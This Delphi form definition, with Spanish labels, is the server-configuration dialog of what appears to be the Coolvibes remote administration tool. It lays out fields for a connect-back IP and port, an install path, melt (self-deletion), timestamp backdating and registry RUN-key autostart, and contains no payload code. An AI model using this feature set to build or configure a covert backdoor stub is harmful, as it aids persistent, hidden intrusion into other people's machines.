object FormConfigServer: TFormConfigServer
  Left = 216
  Top = 22
  Width = 352
  Height = 673
  Caption = 'Configuraci'#243'n de servidor'
  Color = clBtnFace
  Constraints.MaxHeight = 673
  Constraints.MaxWidth = 352
  Constraints.MinHeight = 352
  Constraints.MinWidth = 352
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clHighlight
  Font.Height = -11
  Font.Name = 'Verdana'
  Font.Style = [fsBold]
  OldCreateOrder = False
  Position = poMainFormCenter
  ShowHint = True
  OnCreate = FormCreate
  OnShow = FormShow
  PixelsPerInch = 96
  TextHeight = 13
  object GroupBox1: TGroupBox
    Left = 0
    Top = 0
    Width = 344
    Height = 646
    Align = alClient
    Caption = 'Configurar servidor existente...'
    TabOrder = 0
    object ScrollBox1: TScrollBox
      Left = 2
      Top = 15
      Width = 340
      Height = 537
      HorzScrollBar.Style = ssFlat
      VertScrollBar.Style = ssFlat
      Align = alClient
      BorderStyle = bsNone
      TabOrder = 0
      DesignSize = (
        340
        537)
      object Bevel4: TBevel
        Left = 56
        Top = 472
        Width = 48
        Height = 48
        Hint = 'Haga click aqu'#237' para cargar un icono...'
        ParentShowHint = False
        Shape = bsFrame
        ShowHint = True
      end
      object BtnBrowse: TSpeedButton
        Left = 300
        Top = 3
        Width = 23
        Height = 22
        Hint = 'Seleccionar servidor...'
        Flat = True
        Glyph.Data = {
          36030000424D3603000000000000360000002800000010000000100000000100
          18000000000000030000C40E0000C40E00000000000000000000FF00FFFF00FF
          FF00FFFF00FFFF00FFFF00FFFF00FFFF00FFFF00FFFF00FFFF00FFFF00FFFF00
          FFFF00FFFF00FFFF00FFFF00FFFF00FFFF00FFFF00FFFF00FFFF00FFFF00FFFF
          00FFFF00FFFF00FFFF00FF145D95105A92FF00FFFF00FFFF00FFFF00FFFF00FF
          FF00FFFF00FFFF00FFFF00FFFF00FFFF00FFFF00FFFF00FF22669E1B629A2267
          9D115B93FF00FFFF00FFFF00FFFF00FFFF00FFFF00FFFF00FFFF00FFFF00FFFF
          00FFFF00FF3272AA2B6DA5558DBC89B5DD185F97FF00FFFF00FFFF00FFFF00FF
          FF00FFFF00FFFF00FFFF00FFFF00FFFF00FF447FB73C79B16497C59DC1E46699
          C71F659DFF00FFFF00FFFF00FFFF00FFDDB28FD9AE8AD6A985D3A57FD0A07BCD
          9C76A2938A75A2CCABCBE876A4CE3070A8286BA3FF00FFFF00FFFF00FFE4BD9B
          E1B896E8C9AEF5E1CDF7E5D3F7E5D1F3DDC8DFBA9CC7A89186AED5417DB53977
          AFFF00FFFF00FFFF00FFFF00FFE8C3A2EDD0B7F8E8D9F5DEC8F3D8BDF3D6BBF4
          DBC2F7E4D2DFBB9D9D94924B84BCFF00FFFF00FFFF00FFFF00FFFF00FFECC8A8
          F7E7D7F6E1CCF4DBC2F4DAC0F3D8BDF3D7BBF4DBC2F3DEC9CD9F7BFF00FFFF00
          FFFF00FFFF00FFFF00FFFF00FFF0CEAEF9ECDFF5DFC8F5DDC6F4DCC3F4DAC1F3
          D9BEF3D7BDF8E6D3D3A57FFF00FFFF00FFFF00FFFF00FFFF00FFFF00FFF4D3B4
          F9EDE1F6E1CCF5DFC9F5DEC7F4DCC4F4DBC2F4DAC0F8E7D6D7AA86FF00FFFF00
          FFFF00FFFF00FFFF00FFFF00FFF7D7B9F9EBDEF7E7D6F6E1CCF5E0CAF5DEC8F5
          DDC5F6E1CBF5E2D0DBB08CFF00FFFF00FFFF00FFFF00FFFF00FFFF00FFFADBBD
          F8E2CCFAEEE3F7E7D6F6E2CEF6E1CBF6E3D0F9EADDECCFB5DFB693FF00FFFF00
          FFFF00FFFF00FFFF00FFFF00FFFCDEC0FADBBEF9E2CDFAECDEF9EEE2F9EDE2F8
          E9DAF0D5BDE7C09FE3BC9AFF00FFFF00FFFF00FFFF00FFFF00FFFF00FFFF00FF
          FCDEC1FADCBFF9D9BBF6D6B8F4D3B4F1CFAFEECBABEBC6A6FF00FFFF00FFFF00
          FFFF00FFFF00FFFF00FFFF00FFFF00FFFF00FFFF00FFFF00FFFF00FFFF00FFFF
          00FFFF00FFFF00FFFF00FFFF00FFFF00FFFF00FFFF00FFFF00FF}
        ParentShowHint = False
        ShowHint = True
        OnClick = BtnBrowseClick
      end
      object LabelPath: TLabel
        Left = 8
        Top = 8
        Width = 33
        Height = 13
        Caption = 'Ruta:'
      end
      object BtnGuardarConfig: TSpeedButton
        Left = 120
        Top = 486
        Width = 102
        Height = 22
        Caption = 'Guardar'
        Flat = True
        Glyph.Data = {
          36030000424D3603000000000000360000002800000010000000100000000100
          18000000000000030000C40E0000C40E00000000000000000000FF00FFFF00FF
          8989898383837E7E7E7979797474747070706B6B6BFF00FF007D21037B1E0079
          15FF00FFFF00FFFF00FFFF00FFFF00FF8F8F8F929292D5D3D3E2E0DFDFDCDBE1
          DFDF707070FF00FF01832B43A15F007B1F007919FF00FFFF00FFFF00FFFF00FF
          FF00FF9090908B8B8BC4C2C12297511B9149158F430F8B3B3A9F5E80C19646A3
          620A7B26536757606060A7A7A7A2A2A29C9C9C9797979191919E9E9E299B5B90
          CAA98DC8A58AC6A188C59E6AB68582C29748A566138631516856AEAEAEE4E2E2
          D7D5D5D5D3D2D1CECDCAC4C3319F6394CDAD6FBA8E6BB88966B68561B38067B5
          8283C2983CA05C017F26B4B4B4E0DDDDA7724DA7724DA7724DA7724D37A36B96
          CEB094CDAD91CBAA90CBA874BC908AC7A146A568098836676E69BABABADEDBDB
          B5805ACE9870D8AE91D9AF913DA56F38A36D34A167309D6155AF7C91CBAA4FAB
          74188F46CBCDC8737373C0C0C0DFDCDCB47F59CB956ECD976FCF9971D19B72D2
          9C74D49E75A7724D38A1675AB381289857369438D6D1D0787878C5C5C5E1DEDC
          B37D58C7916BC9936DCB956ECD9770CF9971D19B73A7724D3DA56F319F659CC6
          A250A956D7D3D17E7E7ECACACAE1DFDEB17C57C48E68C6906AC8926BCA946DCC
          966FCE9870A7724DDBD6D6919191C1BBB9C0B9B8D7D3D3848484CECECEE2DFDF
          B07B56B17B56B17C57B27D58B37E58B47F59B5805AA7724DDCD8D79898988D8D
          8D8A8A8AD9D5D48B8B8BD3D3D3F1EFEFE2DFDFE2DFDFE1DFDEE1DEDDE0DDDCDF
          DCDBDEDBDBDEDBD9EDECEB9E9E9EC5BFBEC3BDBBDAD6D5919191D6D6D6D3D3D3
          D0D0D0CCCCCCC8C8C8C3C3C3BFBFBFBABABAB5B5B5B0B0B0AAAAAAA5A5A59493
          93929191DBD7D6989898FF00FFFF00FFFF00FFFF00FFFF00FFCFCFCFCBCBCBDF
          DFDFEAEAEACFCAC9CBC6C5CAC4C3C8C3C1C7C1C1DCD9D89E9E9EFF00FFFF00FF
          FF00FFFF00FFFF00FFFF00FFD0D0D0CCCCCCDCDCDCE6E3E3E1DEDCDFDCDCDFDC
          DBDEDBDBEEECECA5A5A5FF00FFFF00FFFF00FFFF00FFFF00FFFF00FFFF00FFFF
          00FFCDCDCDC9C9C9C4C4C4C0C0C0BBBBBBB6B6B6B0B0B0ABABAB}
        OnClick = BtnGuardarConfigClick
      end
      object Bevel1: TBevel
        Left = 8
        Top = 32
        Width = 326
        Height = 2
        Anchors = [akLeft, akTop, akRight]
      end
      object Label1: TLabel
        Left = 8
        Top = 130
        Width = 55
        Height = 13
        Caption = 'Nombre:'
      end
      object Label2: TLabel
        Left = 8
        Top = 52
        Width = 52
        Height = 13
        Caption = 'IP/DNS:'
      end
      object Label3: TLabel
        Left = 8
        Top = 84
        Width = 47
        Height = 13
        Caption = 'Puerto:'
      end
      object Bevel2: TBevel
        Left = 4
        Top = 110
        Width = 330
        Height = 2
        Anchors = [akLeft, akTop, akRight]
      end
      object Bevel3: TBevel
        Left = 3
        Top = 200
        Width = 331
        Height = 2
        Anchors = [akLeft, akTop, akRight]
      end
      object Label4: TLabel
        Left = 8
        Top = 488
        Width = 41
        Height = 13
        Caption = 'Icono:'
      end
      object ImageIcon: TImage
        Left = 56
        Top = 472
        Width = 48
        Height = 48
        Cursor = crHandPoint
        Hint = 'Haga click aqu'#237' para cargar un icono...'
        Center = True
        ParentShowHint = False
        ShowHint = True
        OnClick = ImageIconClick
      end
      object BtnSalir: TSpeedButton
        Left = 230
        Top = 486
        Width = 91
        Height = 22
        Caption = 'Cerrar'
        Flat = True
        Glyph.Data = {
          36040000424D3604000000000000360000002800000010000000100000000100
          20000000000000040000C40E0000C40E00000000000000000000FFFFFF00FFFF
          FF00FFFFFF00FFFFFF00FFFFFF00FFFFFF00FFFFFF00FFFFFF00FFFFFF00FFFF
          FF00FFFFFF00FFFFFF00FFFFFF00FFFFFF00FFFFFF00FFFFFF00FFFFFF00FFFF
          FF00FFFFFF003F3DED413B38EB08FFFFFF00FFFFFF00FFFFFF00FFFFFF00FFFF
          FF00FFFFFF00211FE3081E1CE241FFFFFF00FFFFFF00FFFFFF00FFFFFF00FFFF
          FF004A47F0414F4CF2FF403EEDFD3C39EB08FFFFFF00FFFFFF00FFFFFF00FFFF
          FF002725E5082422E4FC312FEAFF1F1DE241FFFFFF00FFFFFF00FFFFFF005451
          F3415856F5FF6361FAFF5855F6FF413FEDFC3D3AEC08FFFFFF00FFFFFF00302D
          E7082C2AE6FC413FF1FF4C4AF6FF312FEAFF1F1DE241FFFFFF00FFFFFF005956
          F52B5B58F6FF6562FAFF7170FFFF5956F6FF4240EEFC3E3BEC083937EB083532
          E9FC4745F2FF6362FFFF4A48F4FF2F2DE9FF2220E32BFFFFFF00FFFFFF00FFFF
          FF005A57F52B5B59F6FF6663FAFF7471FFFF5A58F6FF4341EEFC3E3CECFD504D
          F4FF6867FFFF504EF5FF3634EBFF2A27E52BFFFFFF00FFFFFF00FFFFFF00FFFF
          FF00FFFFFF005B58F62B5C5AF6FF6764FAFF7472FFFF7370FFFF706EFFFF6E6C
          FFFF5755F7FF3F3DEEFF3230E82BFFFFFF00FFFFFF00FFFFFF00FFFFFF00FFFF
          FF00FFFFFF00FFFFFF005C59F62B5D5BF7FF7976FFFF5956FFFF5754FFFF7270
          FFFF4846F0FF3C39EB2BFFFFFF00FFFFFF00FFFFFF00FFFFFF00FFFFFF00FFFF
          FF00FFFFFF00FFFFFF00615EF8085D5AF6FD7D79FFFF5E5BFFFF5B58FFFF7674
          FFFF4643EFFD413FED08FFFFFF00FFFFFF00FFFFFF00FFFFFF00FFFFFF00FFFF
          FF00FFFFFF006967FB086663F9FC706DFBFF807EFFFF7E7BFFFF7C79FFFF7977
          FFFF5E5CF7FF4744EFFC4240EE08FFFFFF00FFFFFF00FFFFFF00FFFFFF00FFFF
          FF00716EFD086E6BFCFC7774FDFF8682FFFF7673FCFF6462F8FF605DF7FF6D6A
          FAFF7B79FFFF605DF7FF4845EFFC4341EE08FFFFFF00FFFFFF00FFFFFF007673
          FF087471FEFD7D7AFEFF8A87FFFF7C79FDFF6C69FBFF6361F92B5F5CF72B615E
          F8FF6E6CFAFF7D7AFFFF615FF7FF4946F0FC4441EE05FFFFFF00FFFFFF007774
          FF1F7A77FFFF817EFFFF817EFEFF7471FDFF6C69FB2BFFFFFF00FFFFFF00605D
          F72B625FF8FF6F6DFBFF7E7CFFFF625FF8FF4A47F06F4542EE02FFFFFF00FFFF
          FF007774FF1F7A77FFFF7976FEFF726FFD2BFFFFFF00FFFFFF00FFFFFF00FFFF
          FF00615EF82B6461F8FF6A68F9FF5451F3A84F4DF229FFFFFF00FFFFFF00FFFF
          FF00FFFFFF007774FF1F7774FF2BFFFFFF00FFFFFF00FFFFFF00FFFFFF00FFFF
          FF00FFFFFF00625FF82B5D5BF76F5956F53EFFFFFF00FFFFFF00FFFFFF00FFFF
          FF00FFFFFF00FFFFFF00FFFFFF00FFFFFF00FFFFFF00FFFFFF00FFFFFF00FFFF
          FF00FFFFFF00FFFFFF006360F80AFFFFFF00FFFFFF00FFFFFF00}
        OnClick = BtnSalirClick
      end
      object Label7: TLabel
        Left = 26
        Top = 208
        Width = 95
        Height = 13
        Caption = 'Copiar archivo'
      end
      object Label8: TLabel
        Left = 34
        Top = 228
        Width = 128
        Height = 13
        Caption = 'Nombre de archivo:'
      end
      object Label11: TLabel
        Left = 50
        Top = 320
        Width = 208
        Height = 13
        Caption = 'Borrar despu'#233's de copiar (Melt)'
      end
      object Bevel5: TBevel
        Left = 3
        Top = 368
        Width = 331
        Height = 2
        Anchors = [akLeft, akTop, akRight]
      end
      object Label12: TLabel
        Left = 18
        Top = 376
        Width = 73
        Height = 13
        Caption = 'Auto-Inicio'
      end
      object Label14: TLabel
        Left = 58
        Top = 400
        Width = 77
        Height = 13
        Caption = 'M'#233'todo RUN'
      end
      object Label15: TLabel
        Left = 66
        Top = 419
        Width = 130
        Height = 13
        Caption = 'Nombre de la clave:'
      end
      object Bevel6: TBevel
        Left = 3
        Top = 456
        Width = 331
        Height = 2
        Anchors = [akLeft, akTop, akRight]
      end
      object Label9: TLabel
        Left = 50
        Top = 344
        Width = 166
        Height = 13
        Caption = 'Copiar con fecha anterior'
      end
      object ImageHintFechaAnterior: TImage
        Left = 224
        Top = 340
        Width = 17
        Height = 17
        Cursor = crHandPoint
        ParentShowHint = False
        Picture.Data = {
          07544269746D617036030000424D360300000000000036000000280000001000
          000010000000010018000000000000030000120B0000120B0000000000000000
          0000D8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9EC
          D8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECC1BF
          BEAF93869A644B8D563C8B553C92624BA99186BFBEBED8E9ECD8E9ECD8E9ECD8
          E9ECD8E9ECD8E9ECD8E9ECBBA8A09E6144B28057D5B793DBC3A6DAC3A6D2B490
          AB7A528C5C44B3A6A0D8E9ECD8E9ECD8E9ECD8E9ECD8E9ECBDACA0A15A3ACBA7
          7DD8BB9FC39C77B68A62B48660BE9672D1B397C5A37787553CB3A6A0D8E9ECD8
          E9ECD8E9ECC5C3BFAE7445CFAA81DABCA2BE9166BA8C62B7895FB3845EB1835D
          B0835CCDAA8DC6A5798F5D44C0BFBFD8E9ECD8E9ECC0A585BF915EE0C2A8C596
          6CC29169E1CBB8FEFDFCFFFFFEEADCD0B4855EB3855ED4B599AE7B56AC9185D8
          E9ECD8E9ECBE8A4BDBBC9CD5AD89C7986CC39569C19367EDDFD3FAF7F4BB8B63
          B98A63B88A62C59D78D2B89398634BD8E9ECD8E9ECBF813BE3C7AFD0A276C599
          6BC4976AC49669EEE0D4FBF7F4BF9066BE8F65BE8F64BE9269DFC6AA94553AD8
          E9ECD8E9ECC58840E4C9B0D0A37ACC9D71C79A6CC5986BFFFFFFFFFFFEC39669
          C19468C29468C3986DDFC5AB97573AD8E9ECD8E9ECCB9756E0BC9FDBB393CFA0
          75CD9E72CB9C71DDBFA3DDBFA2C5996BC5996BC4986BD1AB85D8BA97A4674BD8
          E9ECD8E9ECCBB18ECD9C68E7CBB4D4A57AD0A077CF9E74FBF8F5FBF8F5CB9E71
          CB9D71CDA177DFC0A5B98A5BB69785D8E9ECD8E9ECC9C8C2CD9555D9B28CE6CA
          B3D6A97DD1A579E2C4A8E1C3A8D0A276D1A477DDBDA2D0AC85AE7145C4C2BFD8
          E9ECD8E9ECD8E9ECCCBDA8CF904DD9B28CE6CDB8E0BA9DD7AB85D6A982D9B391
          E1C2ABD4AE86B26F3CC1B0A0D8E9ECD8E9ECD8E9ECD8E9ECD8E9ECCDBDA9D097
          57D0A06AE0BFA0E3C5AEE3C5AEDFBC9FC89762BE8545C4B5A0D8E9ECD8E9ECD8
          E9ECD8E9ECD8E9ECD8E9ECD8E9ECCAC8C2CEB492D19B5FCD8F4CCB8E48C99555
          C8AE8BC8C6BFD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9
          ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8
          E9EC}
        ShowHint = True
      end
      object Label5: TLabel
        Left = 8
        Top = 170
        Width = 123
        Height = 13
        Caption = 'Nombre del Plugin:'
      end
      object EditServerPath: TEdit
        Left = 49
        Top = 3
        Width = 249
        Height = 22
        BevelInner = bvNone
        BevelKind = bkFlat
        BevelOuter = bvRaised
        BiDiMode = bdLeftToRight
        BorderStyle = bsNone
        ParentBiDiMode = False
        ReadOnly = True
        TabOrder = 0
      end
      object EditID: TEdit
        Left = 73
        Top = 123
        Width = 224
        Height = 22
        Hint = 
          'El identificador que tendr'#225' el servidor al conectarse con el cli' +
          'ente del Coolvibes'
        BevelInner = bvNone
        BevelKind = bkFlat
        BevelOuter = bvRaised
        BorderStyle = bsNone
        TabOrder = 1
        OnKeyPress = EditIPKeyPress
      end
      object EditIP: TEdit
        Left = 73
        Top = 47
        Width = 224
        Height = 22
        BevelInner = bvNone
        BevelKind = bkFlat
        BevelOuter = bvRaised
        BorderStyle = bsNone
        TabOrder = 2
        OnKeyPress = EditIPKeyPress
      end
      object EditPuerto: TEdit
        Left = 73
        Top = 79
        Width = 56
        Height = 22
        BevelInner = bvNone
        BevelKind = bkFlat
        BevelOuter = bvRaised
        BorderStyle = bsNone
        TabOrder = 3
        OnEndDrag = EditPuertoEndDrag
        OnExit = EditPuertoExit
        OnKeyPress = EditPuertoKeyPress
      end
      object CheckBoxCopiar: TCheckBox
        Left = 8
        Top = 206
        Width = 17
        Height = 17
        TabOrder = 4
        OnClick = CheckBoxCopiarClick
      end
      object EditFileName: TEdit
        Left = 168
        Top = 223
        Width = 129
        Height = 22
        Hint = 'El nombre con el que el servidor se copiar'#225' al instalarse'
        BevelInner = bvNone
        BevelKind = bkFlat
        BevelOuter = bvRaised
        BorderStyle = bsNone
        TabOrder = 5
        OnKeyPress = EditIPKeyPress
      end
      object GrpBoxCopiarA: TGroupBox
        Left = 32
        Top = 248
        Width = 305
        Height = 57
        Anchors = [akLeft, akTop, akRight]
        BiDiMode = bdLeftToRight
        Caption = 'Copiar a:'
        Color = clBtnFace
        Ctl3D = True
        ParentBackground = False
        ParentBiDiMode = False
        ParentColor = False
        ParentCtl3D = False
        ParentShowHint = False
        ShowHint = False
        TabOrder = 6
        object ImageHintCopiarA: TImage
          Left = 272
          Top = 24
          Width = 17
          Height = 17
          Cursor = crHandPoint
          ParentShowHint = False
          Picture.Data = {
            07544269746D617036030000424D360300000000000036000000280000001000
            000010000000010018000000000000030000120B0000120B0000000000000000
            0000D8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9EC
            D8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECC1BF
            BEAF93869A644B8D563C8B553C92624BA99186BFBEBED8E9ECD8E9ECD8E9ECD8
            E9ECD8E9ECD8E9ECD8E9ECBBA8A09E6144B28057D5B793DBC3A6DAC3A6D2B490
            AB7A528C5C44B3A6A0D8E9ECD8E9ECD8E9ECD8E9ECD8E9ECBDACA0A15A3ACBA7
            7DD8BB9FC39C77B68A62B48660BE9672D1B397C5A37787553CB3A6A0D8E9ECD8
            E9ECD8E9ECC5C3BFAE7445CFAA81DABCA2BE9166BA8C62B7895FB3845EB1835D
            B0835CCDAA8DC6A5798F5D44C0BFBFD8E9ECD8E9ECC0A585BF915EE0C2A8C596
            6CC29169E1CBB8FEFDFCFFFFFEEADCD0B4855EB3855ED4B599AE7B56AC9185D8
            E9ECD8E9ECBE8A4BDBBC9CD5AD89C7986CC39569C19367EDDFD3FAF7F4BB8B63
            B98A63B88A62C59D78D2B89398634BD8E9ECD8E9ECBF813BE3C7AFD0A276C599
            6BC4976AC49669EEE0D4FBF7F4BF9066BE8F65BE8F64BE9269DFC6AA94553AD8
            E9ECD8E9ECC58840E4C9B0D0A37ACC9D71C79A6CC5986BFFFFFFFFFFFEC39669
            C19468C29468C3986DDFC5AB97573AD8E9ECD8E9ECCB9756E0BC9FDBB393CFA0
            75CD9E72CB9C71DDBFA3DDBFA2C5996BC5996BC4986BD1AB85D8BA97A4674BD8
            E9ECD8E9ECCBB18ECD9C68E7CBB4D4A57AD0A077CF9E74FBF8F5FBF8F5CB9E71
            CB9D71CDA177DFC0A5B98A5BB69785D8E9ECD8E9ECC9C8C2CD9555D9B28CE6CA
            B3D6A97DD1A579E2C4A8E1C3A8D0A276D1A477DDBDA2D0AC85AE7145C4C2BFD8
            E9ECD8E9ECD8E9ECCCBDA8CF904DD9B28CE6CDB8E0BA9DD7AB85D6A982D9B391
            E1C2ABD4AE86B26F3CC1B0A0D8E9ECD8E9ECD8E9ECD8E9ECD8E9ECCDBDA9D097
            57D0A06AE0BFA0E3C5AEE3C5AEDFBC9FC89762BE8545C4B5A0D8E9ECD8E9ECD8
            E9ECD8E9ECD8E9ECD8E9ECD8E9ECCAC8C2CEB492D19B5FCD8F4CCB8E48C99555
            C8AE8BC8C6BFD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9
            ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8E9ECD8
            E9EC}
          ShowHint = True
        end
        object EditCopyTo: TEdit
          Left = 8
          Top = 21
          Width = 257
          Height = 22
          BevelInner = bvNone
          BevelKind = bkFlat
          BevelOuter = bvRaised
          BorderStyle = bsNone
          ParentShowHint = False
          ShowHint = True
          TabOrder = 0
          OnKeyPress = EditIPKeyPress
        end
      end
      object CheckBoxMelt: TCheckBox
        Left = 32
        Top = 318
        Width = 17
        Height = 17
        TabOrder = 7
      end
      object EditRunName: TEdit
        Left = 201
        Top = 415
        Width = 104
        Height = 22
        Hint = 'El nombre de la clave en el registro'
        BevelInner = bvNone
        BevelKind = bkFlat
        BevelOuter = bvRaised
        BorderStyle = bsNone
        TabOrder = 8
        OnKeyPress = EditIPKeyPress
      end
      object CheckBoxRun: TCheckBox
        Left = 40
        Top = 398
        Width = 17
        Height = 17
        TabOrder = 9
        OnClick = CheckBoxRunClick
      end
      object CheckBoxCopiarConFechaAnterior: TCheckBox
        Left = 32
        Top = 342
        Width = 17
        Height = 17
        TabOrder = 10
      end
      object EditPluginName: TEdit
        Left = 145
        Top = 163
        Width = 152
        Height = 22
        Hint = 'El nombre del plugin una vez que se haya subido al servidor '
        BevelInner = bvNone
        BevelKind = bkFlat
        BevelOuter = bvRaised
        BorderStyle = bsNone
        TabOrder = 11
        OnKeyPress = EditIPKeyPress
      end
    end
    object StatusBar: TStatusBar
      Left = 2
      Top = 625
      Width = 340
      Height = 19
      Panels = <
        item
          Width = 150
        end>
    end
    object MemoOutput: TMemo
      Left = 2
      Top = 552
      Width = 340
      Height = 73
      Align = alBottom
      Lines.Strings = (
        'MemoOutput')
      ScrollBars = ssVertical
      TabOrder = 2
    end
  end
  object OpenDialog: TOpenDialog
    Left = 224
    Top = 88
  end
end
